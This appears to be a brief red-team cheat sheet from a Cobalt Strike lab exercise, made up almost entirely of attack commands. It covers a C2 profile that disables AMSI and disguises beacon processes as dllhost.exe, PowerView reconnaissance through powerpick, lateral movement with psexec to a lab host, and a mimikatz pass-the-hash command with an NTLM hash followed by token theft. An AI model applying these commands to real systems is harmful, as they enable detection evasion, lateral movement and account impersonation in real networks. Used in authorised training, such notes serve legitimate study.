# Settings for C2

```bash
# -- For reflective loader/beacon DLL bypass --

post-ex {
        set amsi_disable "true";

        set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
        set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
}
```

---

# Spawning to a new process manually

```bash
beacon> spawnto x64 %windir%\sysnative\dllhost.exe
beacon> spawnto x86 %windir%\syswow64\dllhost.exe

# Check the process name
powerpick Get-Process -Id $pid | select ProcessName

# Now we should be able to use powerpick
powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
powerpick Get-Domain

# To revert back to the original ProcessName
spawnto
```

---

# Jumping with psexec

```bash
# Set the settings for the target dll
ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
ak-settings spawnto_x86 C:\Windows\SysWOW64\dllhost.exe

# Jump to the target
jump psexec64 fs.dev.cyberbotic.io smb
```

---

# Passing the hash to imperonate a user (lateral movement) (Command Line Detection bypass)

```bash
mimikatz sekurlsa::pth /user:"jking" /domain:"DEV" /ntlm:59fc0f884922b4ce376051134c71e22c /run:notepad.exe
steal_token 17896
```
